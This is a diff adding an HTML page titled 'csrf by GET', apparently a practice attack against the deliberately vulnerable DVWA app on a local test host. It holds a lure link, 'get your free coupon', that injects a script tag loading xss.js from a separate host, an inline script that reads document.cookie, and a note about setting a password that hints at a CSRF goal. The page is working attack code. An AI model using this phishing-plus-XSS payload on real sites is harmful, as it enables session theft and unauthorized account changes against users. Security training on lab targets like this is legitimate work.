@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>csrf by GET</title>
+</head>
+<body>
+set password to: 3333
+
+<a href="http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src='http://127.0.0.1:8080/xss.js'>console.log('hi')</script>&default=English#">
+  get your free coupon
+</a>
+
+<script>
+  console.log(`your cookie is: ${document.cookie}`)
+</script>
+</body>
+</html>
